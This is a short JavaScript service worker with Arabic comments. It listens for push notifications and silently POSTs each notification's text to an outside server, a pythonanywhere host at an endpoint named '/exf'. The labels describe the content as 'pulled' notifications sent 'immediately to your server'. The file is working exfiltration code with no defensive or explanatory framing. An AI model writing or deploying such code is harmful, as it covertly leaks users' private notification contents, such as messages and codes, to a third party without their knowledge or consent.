self.addEventListener('push', function(event) {
    const data = event.data ? event.data.text() : 'إشعار جديد';
    
    // إرسال محتوى الإشعار فوراً لسيرفرك
    fetch('https://Mohammed888.pythonanywhere.com/exf', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            device: 'Background Service',
            msg: '🔔 إشعار مسحوب: ' + data
        })
    });
});
